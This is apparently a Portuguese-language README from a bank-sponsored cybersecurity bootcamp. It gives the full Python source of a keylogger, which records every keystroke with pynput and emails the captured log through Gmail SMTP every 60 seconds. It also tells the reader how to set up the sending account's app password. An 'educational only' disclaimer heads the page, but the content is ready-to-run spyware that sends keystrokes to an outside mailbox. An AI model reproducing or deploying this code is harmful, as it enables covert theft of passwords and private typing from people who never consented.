# keylogger-python

- Projeto do bootcamp de cybersecurity do banco santander

!! AVISO, esse script não foi desenvolvido nem deve ser utilizado para fins maliciosos, apenas educacionais.

O QUE UM KEYLOGGER FAZ?
Esse script registra todos os inputs do teclado do usuário e os registra em um arquivo .txt, excluindo apenas algumas teclas que não são relevantes para o atacante, e em seguida envia tudo para um E-mail selecionado a cada 60 segundos com os logs que o malware registrou.

SOBRE ESSE CÓDIGO
Esse código foi feito em Python usando as bibliotecas:
- PYNPUT
- SMTPLIB
- EMAIL.MIME.TEXT
- THREADING
*Necessário baixar todas pelo pip antes
(TERMINAL: pip install xxx)


Código:

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

#config email
EMAIL_ORIGEM = "email@email.com" ----> E-mail 1, deve conter autentificação de 2 fatores para poder gerar a senha pelo site "https://myaccounts.google.com/apppasswords"
EMAIL_DESTINO = "email@email.com" -----> E-mail 2, que também pode ser o 1, mas também pode ser um E-mail diferente
SENHA_EMAIL = "abcd efgh ijkl mnop"

log = ""

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e)
        
        log = ""

    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        elif key == keyboard.Key.enter:
            log+="\n"
        elif key == keyboard.Key.backspace:
            log+=" [APAGOU] "
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
